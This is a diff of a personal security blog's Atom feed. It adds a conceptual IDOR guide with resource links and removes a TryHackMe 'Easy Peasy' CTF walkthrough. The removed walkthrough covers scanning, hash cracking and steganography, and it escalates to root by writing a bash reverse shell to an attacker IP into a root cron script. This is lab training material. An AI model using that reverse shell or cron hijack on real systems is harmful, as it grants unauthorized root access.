@@ -1,4 +1,100 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-11T20:18:14+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - The Marketplace</title><link href="http://localhost:4000/tryhackme-the-marketplace/" rel="alternate" type="text/html" title="TryHackMe - The Marketplace" /><published>2023-05-11T00:00:00+03:00</published><updated>2023-05-11T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-the-marketplace</id><content type="html" xml:base="http://localhost:4000/tryhackme-the-marketplace/"><![CDATA[<p>Can you take over The Marketplace’s infrastructure?</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-06-30T15:52:12+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">Insecure Direct Object References (IDOR) Guide</title><link href="http://localhost:4000/insecure-direct-object-references-idor-guide/" rel="alternate" type="text/html" title="Insecure Direct Object References (IDOR) Guide" /><published>2023-06-30T00:00:00+03:00</published><updated>2023-06-30T00:00:00+03:00</updated><id>http://localhost:4000/insecure-direct-object-references-idor-guide</id><content type="html" xml:base="http://localhost:4000/insecure-direct-object-references-idor-guide/"><![CDATA[<p>In this article, I will explain <code class="language-plaintext highlighter-rouge">Insecure Direct Object References (IDOR)</code> as best I can.</p>
+
+<p>I shared many <a href="#sources">resources</a> and <a href="#labs">labs</a> in this article, check them out.</p>
+
+<p>I hope the article is useful to you.</p>
+
+<h3 id="topics">Topics</h3>
+
+<ul>
+  <li><a href="#idor">IDOR</a> <br /></li>
+  <li><a href="#sources">IDOR Sources</a> <br /></li>
+  <li><a href="#labs">IDOR Labs</a> <br /></li>
+</ul>
+
+<p><br /></p>
+
+<p><img src="/assets/video/idor-guide/idor.png" alt="sqli" /></p>
+
+<h3 id="idor">What is an IDOR?</h3>
+
+<p><code class="language-plaintext highlighter-rouge">IDOR</code> is a vulnerability that allows an attacker to get unauthorized access and perform actions on the target web application.</p>
+
+<p>There are functions in a Web application that users can run from their accounts. For example, the profile editing function.</p>
+
+<p>Profile editing function is a simple function that each user can run from their account. An authorization check should be done in this function to avoid IDOR vulnerability. For example, when a user with <code class="language-plaintext highlighter-rouge">id=10</code> wants to use this function, the web application should check if this action belongs to the user with id=10. If not, the user can do this on different ids. This user can access and edit profiles of different ids without authorization. <code class="language-plaintext highlighter-rouge">This is IDOR</code>.</p>
+
+<p>IDOR is a <code class="language-plaintext highlighter-rouge">dangerous and critical</code> vulnerability. Although a common vulnerability, it can be <code class="language-plaintext highlighter-rouge">much more complex and hard to detect</code>. The reason for this web applications get more complex as they grow. These complications lead to increased vulnerability. And because of these complications, it is difficult to detect the vulnerability.</p>
+
+<p>Let’s continue with an example from web security academy.</p>
+
+<p><br /></p>
+
+<video width="640" height="360" controls="">
+  <source src="/assets/video/idor-guide/IDOR.mp4" type="video/mp4" />
+</video>
+
+<p><br /></p>
+
+<h3 id="sources">IDOR Sources</h3>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=rloqMGcPMkI">PwnFuction (Video) - Insecure Direct Object Reference (IDOR) Explained</a></li>
+  <li><a href="https://www.youtube.com/watch?v=gINAtzdccts">InsiderPhD (Video) - Finding Your First Bug: Manual IDOR Hunting)</a></li>
+  <li><a href="https://www.youtube.com/watch?v=3K1-a7dnA60&amp;t=260s">STÖK (Video) - Burp Suite tutorial: IDOR vulnerability automation using Autorize and AutoRepeater (bug bounty)</a></li>
+  <li><a href="https://youtu.be/TsJ2XPuGe1k">Mehmet D.INCE (Video) - Web Security 101 0x02, IDOR Insecure Direct Object Reference Zafiyetleri Hakkında Her şey</a></li>
+  <li><a href="https://portswigger.net/web-security/access-control/idor">Web Security Academy - IDOR</a></li>
+  <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References">OWASP - IDOR</a></li>
+  <li><a href="https://blog.intigriti.com/hackademy/idor/">Intigriti - IDOR</a></li>
+  <li><a href="https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/">Bugcrowd - How-To: Find IDOR Vulnerabilities for Large Bounty Rewards</a></li>
+  <li><a href="https://medium.com/@aysebilgegunduz/everything-you-need-to-know-about-idor-insecure-direct-object-references-375f83e03a87">Ayşe Bilgi Gündüz - Everything You Need to Know About IDOR</a></li>
+  <li><a href="https://www.geeksforgeeks.org/insecure-direct-object-reference-idor-vulnerability/?ref=gcse">Geeksforgeeks - IDOR</a></li>
+  <li><a href="https://book.hacktricks.xyz/pentesting-web/idor">HackTricks - IDOR</a></li>
+  <li><a href="https://www.secjuice.com/idor-insecure-direct-object-reference-definition/">Secjuice - IDOR </a></li>
+  <li><a href="https://thehackerish.com/idor-tutorial-hands-on-owasp-top-10-training/">Thehackerish - IDOR Tutorial</a></li>
+  <li><a href="https://medium.com/cyberverse/automating-burp-to-find-idors-2b3dbe9fa0b8">Aditya Soni - Automating BURP to find IDORs</a></li>
+  <li><a href="https://cyberweapons.medium.com/idor-is-everywhere-you-need-to-find-them-3ed12435c9de">ProfessorXSS - IDOR is Everywhere 😁 You need to find them</a></li>
+  <li><a href="https://medium.com/@gonzalocarrascosec/fuzzing-idor-admin-takeover-5343bb8f436e">Gonzalo Carrasco - Fuzzing + IDOR = Admin TakeOver</a></li>
+  <li><a href="https://infosecwriteups.com/all-about-getting-first-bounty-with-idor-849db2828c8">Mukul Trivedi (M0hn1sh) - All About Getting First Bounty with IDOR</a></li>
+  <li><a href="https://medium.com/@swapmaurya20/a-simple-idor-to-account-takeover-88b8a1d2ec24">Swapmaurya - A Simple IDOR to Account Takeover</a></li>
+  <li><a href="https://aseem-shrey.medium.com/attention-to-details-a-curious-case-of-multiple-idors-5a4417ba8848">Aseem Shrey - Attention to Details : Finding Hidden IDORs</a></li>
+  <li><a href="https://vickieli.medium.com/intro-to-idor-9048453a3e5d">Vickie Li - Intro to IDOR</a></li>
+  <li><a href="https://betterprogramming.pub/all-about-idor-attacks-64c4203b518e">Vickie Li - All About IDOR Attacks</a></li>
+  <li><a href="https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489">Vickie Li - How to find more IDORs</a></li>
+  <li><a href="https://sagarsajeev.medium.com/business-logic-vulnerability-via-idor-6d510f1caea9">Sagar Sajeev - Business Logic Vulnerability via IDOR</a></li>
+  <li><a href="https://shahjerry33.medium.com/idor-inside-the-session-storage-88af485fc899">Jerry Shah (Jerry) - IDOR - Inside the Session Storage</a></li>
+  <li><a href="https://medium.com/techiepedia/an-bug-bounty-hunters-guide-to-idor-vulnerabilities-27012bbccd7">Daniel Hunt - A Bug Bounty Hunter’s Guide to IDOR Vulnerabilities</a></li>
+  <li><a href="https://thegrayarea.tech/bug-hunting-101-idors-for-beginners-40a43f7055ea">Graham Zemel - Bug Hunting 101: IDORs for Beginners</a></li>
+  <li><a href="https://junoonbro.medium.com/idors-how-to-find-idors-in-ecommerce-sites-d112bd946fcf">JunoonBro - \(\) IDOR’s — How to find IDORs in Ecommerce sites?</a></li>
+  <li><a href="https://medium.com/@swapmaurya20/3-step-idor-in-hackerresume-a365f2632996">Swapmaurya - 3 Step IDOR in HackerResume</a></li>
+  <li><a href="https://infosecwriteups.com/what-is-idor-vulnerability-and-how-does-it-affect-you-85431d10f8fb">c0d3x27 - What is IDOR Vulnerability, and how does it affect you?</a></li>
+  <li><a href="https://thexssrat.medium.com/idors-what-are-they-and-how-do-you-test-for-them-885c9df4af36">Thexssrat - IDORs: What are they and how do you test for them?</a></li>
+  <li><a href="https://ms-official5878.medium.com/insecure-direct-object-reference-6cbe6dc2f47e">Mohammad Mohsin - Insecure Direct object Reference</a></li>
+  <li><a href="https://sapt.medium.com/insecure-direct-object-reference-cyber-sapiens-internship-task-18-986a5824c797">Prajit Sindhkar - Insecure Direct Object Reference</a></li>
+  <li><a href="https://medium.com/@nynan/what-i-learnt-from-reading-220-idor-bug-reports-6efbea44db7">nynan - What I learnt from reading 220* IDOR bug reports.</a></li>
+  <li><a href="https://ozguralp.medium.com/a-less-known-attack-vector-second-order-idor-attacks-14468009781a">Ozgur Alp - A Less Known Attack Vector, Second Order IDOR Attacks</a></li>
+  <li><a href="https://medium.com/@jedus0r/idor-insecure-direct-object-references-my-first-p1-in-bugbounty-fb01f50e25df">jedus0r - IDOR “Insecure direct object references”, my first P1 in Bugbounty</a></li>
+  <li><a href="https://infosecwriteups.com/leveraging-burp-suite-extension-for-finding-idor-insecure-direct-object-reference-2653f9b89fd4">Dhanush - Leveraging Burp Suite extension for finding IDOR(Insecure Direct Object Reference).</a></li>
+  <li><a href="https://medium.com/@Steiner254/insecure-direct-object-references-idor-16bf0b981b90">Steiner254 - Insecure Direct Object References (IDOR)</a></li>
+  <li><a href="https://medium.com/@sathvika03/insecure-direct-object-reference-2506ecd37a83">Sathvika - Insecure Direct Object Reference</a></li>
+  <li><a href="https://shellmates.medium.com/insecure-direct-object-references-idor-vulnerability-aa48ad99b8c8">Shellmates Club - Insecure direct object references (IDOR) vulnerability</a></li>
+  <li><a href="https://chetan-conikee.medium.com/insecure-direct-object-reference-c33bb851da05">Chetan Conikee - Insecure Direct Object Reference</a></li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="labs">IDOR Labs</h3>
+
+<ul>
+  <li><a href="https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references">Web Security Academy - Lab: Insecure direct object references</a></li>
+  <li><a href="https://tryhackme.com/room/introwebapplicationsecurity">TryHackMe - Web Application Security</a></li>
+  <li><a href="https://tryhackme.com/room/corridor">TryHackMe - Corridor</a></li>
+  <li><a href="https://tryhackme.com/room/neighbour">TryHackMe - Neighbour</a></li>
+</ul>
+
+<p><br />
+<br />
+I hope you liked my article. See you in my other articles:hand:</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="idor, idor guide" /><summary type="html"><![CDATA[In this article, I will explain Insecure Direct Object References (IDOR) as best I can.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/idor1.png" /><media:content medium="image" url="http://localhost:4000/assets/img/idor1.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - The Marketplace</title><link href="http://localhost:4000/tryhackme-the-marketplace/" rel="alternate" type="text/html" title="TryHackMe - The Marketplace" /><published>2023-05-11T00:00:00+03:00</published><updated>2023-05-11T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-the-marketplace</id><content type="html" xml:base="http://localhost:4000/tryhackme-the-marketplace/"><![CDATA[<p>Can you take over The Marketplace’s infrastructure?</p>
 
 <p>This is a medium level machine and looking at the tags we will be focusing on web, xss, docker and sqli.</p>
 
@@ -1675,266 +1771,4 @@ $ show options
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="easy, ctf, cve" /><summary type="html"><![CDATA[Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/source.png" /><media:content medium="image" url="http://localhost:4000/assets/img/source.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Easy Peasy</title><link href="http://localhost:4000/tryhackme-easy-peasy/" rel="alternate" type="text/html" title="TryHackMe - Easy Peasy" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-easy-peasy</id><content type="html" xml:base="http://localhost:4000/tryhackme-easy-peasy/"><![CDATA[<p>Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.</p>
-
-<p>Let’s start.</p>
-
-<p><br /></p>
-
-<h2 id="1-enumeration-through-nmap">1. Enumeration through Nmap</h2>
-
-<p>Deploy the machine attached to this task and use nmap to enumerate it.</p>
-
-<p><br /></p>
-
-<h3 id="11-how-many-ports-are-open">1.1 How many ports are open?</h3>
-
-<p>Let’s do a nmap scan first.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.46.132 -p-
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/nmap.png" alt="nmap" /></p>
-
-<p>Three ports are open. These are <strong><code class="language-plaintext highlighter-rouge">80/tcp HTTP, 6498/tcp SSH, and 65524/tcp HTTP</code></strong>.</p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: 3</code></strong></p>
-
-<p><br /></p>
-<h3 id="12-what-is-the-version-of-nginx">1.2 What is the version of nginx?</h3>
-
-<p>Look carefully at port 80.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/nginx.png" alt="nginx" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: 1.16.1</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="13-what-is-running-on-the-highest-port">1.3 What is running on the highest port?</h3>
-
-<p>The highest port is 65524.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/apache.png" alt="apache" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: apache</code></strong></p>
-
-<p><br /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h3 id="2-compromising-the-machine">2 Compromising the machine</h3>
-
-<p>Now you’ve enumerated the machine, answer questions and compromise it!</p>
-
-<p><br /></p>
-
-<h3 id="21-using-gobuster-find-flag-1">2.1 Using GoBuster, find flag 1.</h3>
-
-<p>I’m visiting the site running on port 80 and I see such a page.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/first-home.png" alt="first-home" /></p>
-
-<p>I checked the source page but couldn’t find anything remarkable.</p>
-
-<p>Let’s do a gobuster scan and see if we can find anything.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$  gobuster dir -u http://10.10.46.132/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/gobuster-one.png" alt="gobuster-one" /></p>
-
-<p>We found /hidden the directory. I’ve been looking through the page but couldn’t find any flags. I’m scanning this directory with gobuster.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.46.132/hidden/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/whatever.png" alt="whatever" /></p>
-
-<p>Nothing appears on the page. Let’s look at the source page.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/decode.png" alt="decode" /></p>
-
-<p>I see an encrypted text. It looks like base64 code. Let’s crack it.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "ZmxhZZ3tmMXJzN19mbDRnfQ==" | base64 -d
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/encode.png" alt="encode" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{*********}</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="22-further-enumerate-the-machine-what-is-flag-2">2.2 Further enumerate the machine, what is flag 2?</h3>
-
-<p>For the second flag, we’ll jump to the other web service running on port 65524/tcp. There is a robots.txt file that discloses a hash.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/robots.png" alt="robots" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">a18672860d0510e5ab6699730763b250</code></strong></p>
-
-<p>Let’s look at the type of hash with hash-identifer.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/id-robots.png" alt="id-robots" /></p>
-
-<p>We found the type MD5. Let’s crack it.</p>
-
-<p>I found a site that can crack it online. <a href="https://md5hashing.net/hash">Here</a></p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/cracking-robots.png" alt="cracking-robots" /></p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/crack-robots.png" alt="crack-robots" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{********}</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="23-crack-the-hash-with-easypeasytxt-what-is-the-flag-3">2.3 Crack the hash with easypeasy.txt, What is the flag 3?</h3>
-
-<p>When we take a look at Apache, something remarkable emerges.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/flag3.png" alt="flag3" /></p>
-
-<p>let’s crack it :9fdafbd64c47471a8f54cd3fc64cd312</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/crack-flag3.png" alt="crack-flag3" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{*************************}</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="24-what-is-the-hidden-directory">2.4 What is the hidden directory?</h3>
-
-<p>When we go to the source page of the Apache page, we see something like this.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/apache-source.png" alt="apache-source" /></p>
-
-<p><code class="language-plaintext highlighter-rouge">&lt;p hidden&gt;its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu&lt;/p&gt;</code></p>
-
-<p>Encrypted using bas62. Let’s decrypt using <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a>.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/crack-one.png" alt="crack-one" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: /n0th1ng3ls3m4tt3r</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="25-using-the-wordlist-that-provided-to-you-in-this-task-crack-the-hash">2.5 Using the wordlist that provided to you in this task crack the hash</h3>
-<p>what is the password?</p>
-
-<p><em>Hint: GOST Hash john –wordlist=easypeasy.txt –format=gost hash (optional* Delete duplicated lines,Compare easypeasy.txt to rockyou.txt and delete same words)</em></p>
-
-<p>Let’s go to <a href="http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/">http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/</a> . Here is the page that comes up.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/find-dict.png" alt="find-dict" /></p>
-
-<p>Let’s check the source of the page.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/dict-source.png" alt="dict-source" /></p>
-
-<p>We found this hash.. <code class="language-plaintext highlighter-rouge">940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</code></p>
-
-<p>First I look at the type with hash-identifier.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/dict-source-id.png" alt="dict-source-id" /></p>
-
-<p>It looks like it was encrypted with Sha-256 but when I tried to crack it it didn’t. Let’s crack it starting from the clue.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=easypeasy.txt --format=gost hash.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/dict-source-crack.png" alt="dict-source-crack" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: **********</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="26-what-is-the-password-to-login-to-the-machine-via-ssh">2.6 What is the password to login to the machine via SSH?</h3>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/dict-source.png" alt="dict-source" /></p>
-
-<p>Let’s download the picture on the page and see. <strong><code class="language-plaintext highlighter-rouge">binarycodepixabay.jpg</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/pixabay.png" alt="pixabay" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
-$ steghide extract -sf binarycodepixabay.jpg
-$ cat secrettext.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/secrettext.png" alt="secrettext" /></p>
-
-<p>We found the username and password.</p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Username: boring</code></strong></p>
-
-<p>Let’s crack the encrypted password first.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/crack-pixabay.png" alt="crack-pixabay" /></p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">Answer: iconvertedmypasswordtobinary</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="27-what-is-the-user-flag">2.7 What is the user flag?</h3>
-
-<p>Let’s do ssh login. Remember ssh is running on port 6498.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i boring@10.10.120.186 -p- 6498
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/sshin.png" alt="sshin" /></p>
-
-<p>And we are inside. Let’s get the user flag.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/user-flag.png" alt="user-flag" /></p>
-
-<p>We found this <strong><code class="language-plaintext highlighter-rouge">synt{***********}</code></strong>. Let’s crack it.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/rot.png" alt="rot" /></p>
-
-<p><br /></p>
-
-<h3 id="28-what-is-the-root-flag">2.8 What is the root flag?</h3>
-
-<p>We need root privilege . I try <code class="language-plaintext highlighter-rouge">sudo l</code> first but it doesn’t work. Then I check the cron job.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/cron.png" alt="cron" /></p>
-
-<p>We found something useful here. Let’s go to the file and do a reverse-shell.</p>
-
-<p>First, let’s set up a netcat listener on our own machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
-</code></pre></div></div>
-
-<p>Let’s change the file on the target machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nano /var/www/.mysecretcronjob.sh
-#!/bin/bash
-# i will run as root
-bash -i &gt;&amp; /dev/tcp/10.8.86.168/4444 0&gt;&amp;1
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/secretjob.png" alt="secretjob" /></p>
-
-<p>After waiting for a while, we get root privileges.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/root-in.png" alt="root-in" /></p>
-
-<p>Yes, we have root privileges. Let’s get the root flag.</p>
-
-<p><img src="/assets/img/tryhackme/easy-peasy/root-flag.png" alt="root-flag" /></p>
-
-<p><br /></p>
-
-<hr />
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="nmap," /><category term="gobuster," /><category term="cronjob" /><summary type="html"><![CDATA[Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/easy-peasy.png" /><media:content medium="image" url="http://localhost:4000/assets/img/easy-peasy.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="easy, ctf, cve" /><summary type="html"><![CDATA[Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/source.png" /><media:content medium="image" url="http://localhost:4000/assets/img/source.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
